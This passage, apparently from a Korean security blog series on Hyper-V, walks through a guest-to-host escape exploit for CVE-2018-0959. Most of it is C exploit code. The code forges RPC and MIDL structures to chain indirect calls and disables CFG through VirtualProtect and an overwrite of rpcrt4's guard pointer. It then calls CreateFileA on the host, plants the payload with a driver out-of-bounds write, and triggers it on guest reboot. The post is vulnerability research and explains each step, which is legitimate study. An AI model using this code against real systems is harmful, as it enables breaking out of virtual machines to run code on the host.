		&lt;span class=&#34;hljs-comment&#34;&gt;//ProcDesc = &amp;amp;pRpcMsg-&amp;gt;Buffer + 0x30;//after ProcDescPointer&lt;/span&gt;
		ProcDesc = &amp;amp;ProcString[ProcStringCursor + &lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;];
		ProcDesc[&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;&lt;span class=&#34;hljs-comment&#34;&gt;//ignore return value&lt;/span&gt;
		ProcDesc[&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;] = pRpcMsg-&amp;gt;BufferLength/&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;;&lt;span class=&#34;hljs-comment&#34;&gt;//NumberParams&lt;/span&gt;
		Param = ProcDesc + &lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;;
		ProcStringCursor += &lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt; + &lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;;&lt;span class=&#34;hljs-comment&#34;&gt;//ProcString + ProcDesc len&lt;/span&gt;
		&lt;span class=&#34;hljs-keyword&#34;&gt;break&lt;/span&gt;;

	&lt;span class=&#34;hljs-keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;:&lt;span class=&#34;hljs-comment&#34;&gt;//GetCopy(this, dest)&lt;/span&gt;
		*(&lt;span class=&#34;hljs-keyword&#34;&gt;short&lt;/span&gt;*)&amp;amp;ProcString[ProcStringCursor + &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0x10&lt;/span&gt;;&lt;span class=&#34;hljs-comment&#34;&gt;//StackSize &amp;lt;- Buffer Length&lt;/span&gt;
		pRpcMsg-&amp;gt;BufferLength = &lt;span class=&#34;hljs-number&#34;&gt;0x10&lt;/span&gt;;
		ProcDesc = &amp;amp;ProcString[ProcStringCursor + &lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;];
		ProcDesc[&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;&lt;span class=&#34;hljs-comment&#34;&gt;//ignore return value&lt;/span&gt;
		ProcDesc[&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;] = pRpcMsg-&amp;gt;BufferLength/&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;;&lt;span class=&#34;hljs-comment&#34;&gt;//NumberParams&lt;/span&gt;
		Param = ProcDesc + &lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;;
		ProcStringCursor += &lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt; + &lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;;&lt;span class=&#34;hljs-comment&#34;&gt;//ProcString + ProcDesc len&lt;/span&gt;
		&lt;span class=&#34;hljs-keyword&#34;&gt;break&lt;/span&gt;;

	&lt;span class=&#34;hljs-keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;:&lt;span class=&#34;hljs-comment&#34;&gt;//CreateFileA&lt;/span&gt;
		*(&lt;span class=&#34;hljs-keyword&#34;&gt;short&lt;/span&gt;*)&amp;amp;ProcString[ProcStringCursor + &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0x8&lt;/span&gt; * &lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;;&lt;span class=&#34;hljs-comment&#34;&gt;//StackSize &amp;lt;- Buffer Length&lt;/span&gt;
		pRpcMsg-&amp;gt;BufferLength = &lt;span class=&#34;hljs-number&#34;&gt;0x8&lt;/span&gt; * &lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;;
		ProcDesc = &amp;amp;ProcString[ProcStringCursor + &lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;];
		ProcDesc[&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;&lt;span class=&#34;hljs-comment&#34;&gt;//ignore return value&lt;/span&gt;
		ProcDesc[&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;] = pRpcMsg-&amp;gt;BufferLength/&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;;&lt;span class=&#34;hljs-comment&#34;&gt;//NumberParams&lt;/span&gt;
		Param = ProcDesc + &lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;;
		ProcStringCursor += &lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt; + &lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;;&lt;span class=&#34;hljs-comment&#34;&gt;//ProcString + ProcDesc len&lt;/span&gt;
		&lt;span class=&#34;hljs-keyword&#34;&gt;break&lt;/span&gt;;

	&lt;span class=&#34;hljs-keyword&#34;&gt;default&lt;/span&gt;:
		&lt;span class=&#34;hljs-keyword&#34;&gt;break&lt;/span&gt;;
	}
	&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (Param &amp;amp;&amp;amp; ProcDesc &amp;amp;&amp;amp; pRpcMsg-&amp;gt;BufferLength) {&lt;span class=&#34;hljs-comment&#34;&gt;//ProcDesc is Not NULL and StackSize is bigger than 0 =&amp;gt; have parameter&lt;/span&gt;
		&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;\t[+] Param Info: Num of param=%d, StackSize=0x%x, \n&amp;quot;&lt;/span&gt;, ProcDesc[&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;], pRpcMsg-&amp;gt;BufferLength);
		*(__int64*)&amp;amp;ProcDesc[&lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;] = (__int64)pRpcMsg-&amp;gt;Buffer + &lt;span class=&#34;hljs-number&#34;&gt;0x10&lt;/span&gt; + *(&lt;span class=&#34;hljs-keyword&#34;&gt;short&lt;/span&gt;*)&amp;amp;ProcString[&lt;span class=&#34;hljs-number&#34;&gt;0x10&lt;/span&gt; * i + &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;];&lt;span class=&#34;hljs-comment&#34;&gt;//address of buffer + bufferlen+ ProcDescLen&lt;/span&gt;
		&lt;span class=&#34;hljs-comment&#34;&gt;//Param = (char*)&amp;amp;(pRpcMsg-&amp;gt;Buffer) + 0x20 + *(short*)&amp;amp;ProcString[0x10 * i + 4];&lt;/span&gt;
		&lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; j = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; j &amp;lt; pRpcMsg-&amp;gt;BufferLength / &lt;span class=&#34;hljs-number&#34;&gt;0x4&lt;/span&gt;; j++) {
			Param[j * &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0x8&lt;/span&gt; | &lt;span class=&#34;hljs-number&#34;&gt;0x40&lt;/span&gt;;&lt;span class=&#34;hljs-comment&#34;&gt;//flag, used in Unmarshaling&lt;/span&gt;
			Param[j * &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt; + &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;] = j * &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;;&lt;span class=&#34;hljs-comment&#34;&gt;//Stack Index of parameter&lt;/span&gt;
			Param[j * &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt; + &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;;&lt;span class=&#34;hljs-comment&#34;&gt;//Size of Param&lt;/span&gt;
			ProcStringCursor += &lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;;&lt;span class=&#34;hljs-comment&#34;&gt;//add params len&lt;/span&gt;
		}
	}
	&lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;\t[+] Param Info: No param\n&amp;quot;&lt;/span&gt;);

}&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;RPC-Structures&#34;&gt;&lt;a href=&#34;#RPC-Structures&#34; class=&#34;headerlink&#34; title=&#34;RPC Structures&#34;&gt;&lt;/a&gt;RPC Structures&lt;/h3&gt;&lt;p&gt;&lt;code&gt;NdrServerCall2&lt;/code&gt;&amp;#xC5D0; &amp;#xD544;&amp;#xC694;&amp;#xD55C; RPC &amp;#xAD6C;&amp;#xC870;&amp;#xCCB4;&amp;#xB4E4;&amp;#xC744; &amp;#xCD08;&amp;#xAE30;&amp;#xD654;&amp;#xD558;&amp;#xB294; &amp;#xBD80;&amp;#xBD84;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD398;&amp;#xC774;&amp;#xB85C;&amp;#xB4DC; &amp;#xC0C1;&amp;#xC5D0;&amp;#xC11C; &amp;#xB178;&amp;#xB4DC;&amp;#xBCF4;&amp;#xB2E4; &amp;#xB4A4;&amp;#xC5D0; &amp;#xC704;&amp;#xCE58;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xAC04;&amp;#xC811; &amp;#xD638;&amp;#xCD9C; &amp;#xB8E8;&amp;#xD504;&amp;#xB97C; &amp;#xC2DC;&amp;#xC791;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB3C4;&amp;#xB85D; &lt;code&gt;_listChanges&lt;/code&gt;&amp;#xB97C; 1&amp;#xBC88;&amp;#xC9F8; &amp;#xB178;&amp;#xB4DC;&amp;#xB85C; &amp;#xC124;&amp;#xC815;&amp;#xD558;&amp;#xACE0; &amp;#xB9C8;&amp;#xC9C0;&amp;#xB9C9; &amp;#xB178;&amp;#xB4DC;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &amp;#xCCAB; &amp;#xBC88;&amp;#xC9F8; &amp;#xB178;&amp;#xB4DC;&amp;#xC758; &lt;code&gt;_LIST_ENTRY&lt;/code&gt;&amp;#xB97C; &amp;#xAC00;&amp;#xB9AC;&amp;#xD0A4;&amp;#xAC8C; &amp;#xB9CC;&amp;#xB4E4;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs C&#34;&gt;pRpcMsg = payload;
pRpcMsg-&amp;gt;Buffer = (__int64)pRpcMsg-&amp;gt;Buffer | (&lt;span class=&#34;hljs-number&#34;&gt;0x7&lt;/span&gt; &amp;lt;&amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;0x18&lt;/span&gt;);&lt;span class=&#34;hljs-comment&#34;&gt;// for vm::onprepare&amp;apos;s error check&lt;/span&gt;
VideoDirtListenerOffset[&lt;span class=&#34;hljs-number&#34;&gt;0xb8&lt;/span&gt;/&lt;span class=&#34;hljs-number&#34;&gt;0x8&lt;/span&gt;] = start + &lt;span class=&#34;hljs-number&#34;&gt;0x150&lt;/span&gt;;&lt;span class=&#34;hljs-comment&#34;&gt;//init _listChanges&lt;/span&gt;
node = payload + &lt;span class=&#34;hljs-number&#34;&gt;0x100&lt;/span&gt; * &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;;&lt;span class=&#34;hljs-comment&#34;&gt;//last indirect call loop&lt;/span&gt;
node[&lt;span class=&#34;hljs-number&#34;&gt;0x58&lt;/span&gt; / &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;] = start + &lt;span class=&#34;hljs-number&#34;&gt;0xb0&lt;/span&gt;;&lt;span class=&#34;hljs-comment&#34;&gt;//escape loop&lt;/span&gt;


&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt;* trailer = payload + &lt;span class=&#34;hljs-number&#34;&gt;0x100&lt;/span&gt; * INDIRECT_CALL_CHAIN_LEN;
__int64* indirectCallTable = trailer, * buffer = &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;;
MIDL_STUB_DESC *pDesc = (PMIDL_STUB_DESC) (indirectCallTable + INDIRECT_CALL_CHAIN_LEN);



pDesc-&amp;gt;pMallocFreeStruct = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
pDesc-&amp;gt;Version = &lt;span class=&#34;hljs-number&#34;&gt;0xb000&lt;/span&gt;;

pMidl = (PMIDL_SERVER_INFO)(pDesc + &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;);
pMidl-&amp;gt;DispatchTable = DispatchTable;
pMidl-&amp;gt;ProcString = ProcStringAddress;&lt;span class=&#34;hljs-comment&#34;&gt;//vaild address&lt;/span&gt;
pMidl-&amp;gt;FmtStringOffset = FmtStringOffsetAddress;&lt;span class=&#34;hljs-comment&#34;&gt;//vaild address&lt;/span&gt;
pMidl-&amp;gt;pStubDesc = MidlStubDesc;&lt;span class=&#34;hljs-comment&#34;&gt;//vaild address&lt;/span&gt;
pMidl-&amp;gt;ThunkTable = &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;;

pServerInterface = (PRPC_SERVER_INTERFACE)(pMidl + &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;);
pServerInterface-&amp;gt;InterpreterInfo = MidlSrvInfo;
pServerInterface-&amp;gt;Flags = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;&lt;span class=&#34;hljs-comment&#34;&gt;//to avoid NdrStubCall2 line 354&amp;apos;s branch&lt;/span&gt;

&lt;span class=&#34;hljs-built_in&#34;&gt;memcpy&lt;/span&gt;(payload + (vftable - VideoDirtListener), VideoDirtListenerEntries, &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt; * ENTRY_LEN);&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;Setting-Arguments&#34;&gt;&lt;a href=&#34;#Setting-Arguments&#34; class=&#34;headerlink&#34; title=&#34;Setting Arguments&#34;&gt;&lt;/a&gt;Setting Arguments&lt;/h3&gt;&lt;p&gt;&lt;code&gt;DispatchTable&lt;/code&gt;&amp;#xC5D0; &amp;#xD638;&amp;#xCD9C;&amp;#xB420; &amp;#xD568;&amp;#xC218;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xC800;&amp;#xC7A5;&amp;#xD558;&amp;#xACE0; &amp;#xB178;&amp;#xB4DC; &amp;#xBCC4;&amp;#xB85C; &amp;#xBC84;&amp;#xD37C;&amp;#xC5D0; &amp;#xD638;&amp;#xCD9C;&amp;#xB420; &amp;#xD568;&amp;#xC218;&amp;#xC758; &amp;#xC778;&amp;#xC790;&amp;#xB97C; &amp;#xC124;&amp;#xC815;&amp;#xD574;&amp;#xC90D;&amp;#xB2C8;&amp;#xB2E4;.&lt;br&gt;&lt;pre&gt;&lt;code class=&#34;hljs C&#34;&gt;



&lt;span class=&#34;hljs-comment&#34;&gt;//avoid Exception NdrStubCall2 &amp;amp; NdrpServerUnmarshal&lt;/span&gt;
&lt;span class=&#34;hljs-comment&#34;&gt;//NdrStubCall2 line 417&lt;/span&gt;
&lt;span class=&#34;hljs-comment&#34;&gt;//NdrpServerUnMarshal line 411&lt;/span&gt;
indirectCallTable[&lt;span class=&#34;hljs-number&#34;&gt;19&lt;/span&gt;] = KernelBase_VirtualProtect;

&lt;span class=&#34;hljs-comment&#34;&gt;//call VirtualProtect(rpcrt4!_guard_check_icall_fptr, 0x8, 0x4, `some writable address`);&lt;/span&gt;
indirectCallTable[&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;] = KernelBase_VirtualProtect;

node = payload + &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; * &lt;span class=&#34;hljs-number&#34;&gt;0x100&lt;/span&gt;;
pRpcMsg = node;
pRpcMsg-&amp;gt;ManagerEpv = &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;;
pRpcMsg-&amp;gt;RpcFlags = &lt;span class=&#34;hljs-number&#34;&gt;0x1000&lt;/span&gt; | &lt;span class=&#34;hljs-number&#34;&gt;0x10000000&lt;/span&gt; | &lt;span class=&#34;hljs-number&#34;&gt;0x20000000&lt;/span&gt;;
buffer = node + &lt;span class=&#34;hljs-number&#34;&gt;0x60&lt;/span&gt;/&lt;span class=&#34;hljs-number&#34;&gt;0x8&lt;/span&gt;;
buffer[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;] = rpcrt4_guard_check_icall_fptr;
buffer[&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0x8&lt;/span&gt;;
buffer[&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0x4&lt;/span&gt;;
buffer[&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;] = pRpcMsg-&amp;gt;Buffer;

&lt;span class=&#34;hljs-comment&#34;&gt;//call GetCopy&lt;/span&gt;
indirectCallTable[&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;] = combase + &lt;span class=&#34;hljs-number&#34;&gt;0xd9100&lt;/span&gt;;
node = payload + &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt; * &lt;span class=&#34;hljs-number&#34;&gt;0x100&lt;/span&gt;;
pRpcMsg = node;
pRpcMsg-&amp;gt;ManagerEpv = &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;;
pRpcMsg-&amp;gt;RpcFlags = &lt;span class=&#34;hljs-number&#34;&gt;0x1000&lt;/span&gt; | &lt;span class=&#34;hljs-number&#34;&gt;0x10000000&lt;/span&gt; | &lt;span class=&#34;hljs-number&#34;&gt;0x20000000&lt;/span&gt;;
buffer = node + &lt;span class=&#34;hljs-number&#34;&gt;0x60&lt;/span&gt;/&lt;span class=&#34;hljs-number&#34;&gt;0x8&lt;/span&gt;;
buffer[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;] = (&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt;*)pRpcMsg-&amp;gt;Buffer + &lt;span class=&#34;hljs-number&#34;&gt;0x18&lt;/span&gt;;&lt;span class=&#34;hljs-comment&#34;&gt;//this&lt;/span&gt;
buffer[&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;] = rpcrt4_guard_check_icall_fptr;&lt;span class=&#34;hljs-comment&#34;&gt;//dest&lt;/span&gt;
buffer[&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;] = ret;
&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt;* pThis = &amp;amp;buffer[&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;];
*(&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;*)&amp;amp;pThis[&lt;span class=&#34;hljs-number&#34;&gt;0x14&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0x8&lt;/span&gt;;
*(__int64*)&amp;amp;pThis[&lt;span class=&#34;hljs-number&#34;&gt;0x18&lt;/span&gt;] = (&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt;*)pRpcMsg-&amp;gt;Buffer + &lt;span class=&#34;hljs-number&#34;&gt;0x10&lt;/span&gt; - &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;;


&lt;span class=&#34;hljs-comment&#34;&gt;//call CreateFileA&lt;/span&gt;
indirectCallTable[&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;] = KernelBase + &lt;span class=&#34;hljs-number&#34;&gt;0x41700&lt;/span&gt;;&lt;span class=&#34;hljs-comment&#34;&gt;//CreateFileA&lt;/span&gt;
node = payload + &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt; * &lt;span class=&#34;hljs-number&#34;&gt;0x100&lt;/span&gt;;
pRpcMsg = node;
pRpcMsg-&amp;gt;ManagerEpv = &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;;
pRpcMsg-&amp;gt;RpcFlags = &lt;span class=&#34;hljs-number&#34;&gt;0x1000&lt;/span&gt; | &lt;span class=&#34;hljs-number&#34;&gt;0x10000000&lt;/span&gt; | &lt;span class=&#34;hljs-number&#34;&gt;0x20000000&lt;/span&gt;;
buffer = node + &lt;span class=&#34;hljs-number&#34;&gt;0x60&lt;/span&gt;/&lt;span class=&#34;hljs-number&#34;&gt;0x8&lt;/span&gt;;
buffer[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;] = (&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt;*)pRpcMsg-&amp;gt;Buffer + &lt;span class=&#34;hljs-number&#34;&gt;0x8&lt;/span&gt; * &lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;;&lt;span class=&#34;hljs-comment&#34;&gt;//file name&lt;/span&gt;
buffer[&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;] = GENERIC_READ | GENERIC_WRITE;&lt;span class=&#34;hljs-comment&#34;&gt;//desired access&lt;/span&gt;
buffer[&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
buffer[&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
buffer[&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;] = CREATE_ALWAYS;
buffer[&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;] = FILE_ATTRIBUTE_NORMAL;
buffer[&lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;] = &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;;
&lt;span class=&#34;hljs-built_in&#34;&gt;memcpy&lt;/span&gt;(&amp;amp;buffer[&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;], &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;C:\\Users\\Public\\Hackyboiz\0&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;27&lt;/span&gt;);


WriteInfo writeInfo = { &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, };

&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Offset Between FindVdl Buffer start and VideoDirtListener: %llx\n&amp;quot;&lt;/span&gt;, (&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt;*)VideoDirtListenerOffset - (&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt;*)FindVdl.buffer);

writeInfo.from = FindVdl.from + ((&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt;*)VideoDirtListenerOffset - (&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt;*)FindVdl.buffer);

writeInfo.from -= writeInfo.from % &lt;span class=&#34;hljs-number&#34;&gt;0x200&lt;/span&gt;;

writeInfo.to = writeInfo.from + &lt;span class=&#34;hljs-number&#34;&gt;0x800&lt;/span&gt;;
&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] FindVdl Buffer (%p~)\n[+] VideoDirtListener ptr: %p\n[+] Write from %x to %x\n&amp;quot;&lt;/span&gt;, FindVdl.buffer, VideoDirtListenerOffset, writeInfo.from, writeInfo.to);

writeInfo.buffer = (&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt;*)FindVdl.buffer + (writeInfo.from - FindVdl.from);

&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Write Payload on TargetHeap\n&amp;quot;&lt;/span&gt;);
&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Overwrite Range: Landpoint+0x%x ~ Landpoint+0x%x\n&amp;quot;&lt;/span&gt;, writeInfo.from, writeInfo.to);
DeviceIoControl(driver, CORRUPT_IOCTL, &amp;amp;writeInfo, &lt;span class=&#34;hljs-keyword&#34;&gt;sizeof&lt;/span&gt;(WriteInfo), &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;);
&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Payload is Ready, Reboot Guest To Trigger Payload\n&amp;quot;&lt;/span&gt;);
&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;h2 id=&#34;Trigger-Payload&#34;&gt;&lt;a href=&#34;#Trigger-Payload&#34; class=&#34;headerlink&#34; title=&#34;Trigger Payload&#34;&gt;&lt;/a&gt;Trigger Payload&lt;/h2&gt;&lt;p&gt;Exploit&amp;#xC744; &amp;#xC2E4;&amp;#xD589;&amp;#xD558;&amp;#xBA74; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC774; &amp;#xB178;&amp;#xB4DC;&amp;#xB4E4;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xB098; DLL &amp;#xC8FC;&amp;#xC18C; &amp;#xB4F1;&amp;#xC758; &amp;#xC815;&amp;#xBCF4;&amp;#xAC00; &amp;#xCD9C;&amp;#xB825;&amp;#xB418;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xBCFC; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. OOB Write&amp;#xB85C; &amp;#xD398;&amp;#xC774;&amp;#xB85C;&amp;#xB4DC;&amp;#xB97C; &amp;#xC4F0;&amp;#xB294; &amp;#xAC83;&amp;#xC774; &amp;#xB05D;&amp;#xB09C; &amp;#xB2E4;&amp;#xC74C; &amp;#xAC00;&amp;#xC0C1;&amp;#xBA38;&amp;#xC2E0;&amp;#xC744; &amp;#xC7AC;&amp;#xBD80;&amp;#xD305;&amp;#xD558;&amp;#xBA74; &amp;#xD398;&amp;#xC774;&amp;#xB85C;&amp;#xB4DC;&amp;#xAC00; &amp;#xC2E4;&amp;#xD589;&amp;#xB418;&amp;#xC5B4; &lt;code&gt;C:\User\Public&lt;/code&gt; &amp;#xBC11;&amp;#xC5D0; &amp;#xD30C;&amp;#xC77C;&amp;#xC774; &amp;#xC0DD;&amp;#xC131;&amp;#xB420; &amp;#xAC83;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;br&gt;&lt;img src=&#34;/2023/10/30/pwndorei/newjeans-hyper-v-pt5/image8.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xB9C8;&amp;#xC9C0;&amp;#xB9C9;&amp;#xC73C;&amp;#xB85C; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787; &amp;#xC2DC;&amp;#xC5F0; &amp;#xC601;&amp;#xC0C1;&amp;#xC744; &amp;#xBCF4;&amp;#xC2DC;&amp;#xC8E0;!&lt;/p&gt;
&lt;h1 id=&#34;Exploit&#34;&gt;&lt;a href=&#34;#Exploit&#34; class=&#34;headerlink&#34; title=&#34;Exploit&#34;&gt;&lt;/a&gt;Exploit&lt;/h1&gt;&lt;iframe width=&#34;560&#34; height=&#34;315&#34; src=&#34;https://www.youtube.com/embed/LvtNtkAll84?si=VRM1u7HSuegWqPoW&#34; title=&#34;YouTube video player&#34; frameborder=&#34;0&#34; allow=&#34;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&#34; allowfullscreen&gt;&lt;/iframe&gt;

&lt;p&gt;&amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787; &amp;#xAD00;&amp;#xB828; &amp;#xCF54;&amp;#xB4DC;&amp;#xB4E4;&amp;#xC740; &lt;a href=&#34;https://github.com/pwndorei/CVE-2018-0959&#34;&gt;&amp;#xC5EC;&amp;#xAE30;&lt;/a&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xD655;&amp;#xC778;&amp;#xD558;&amp;#xC2E4; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
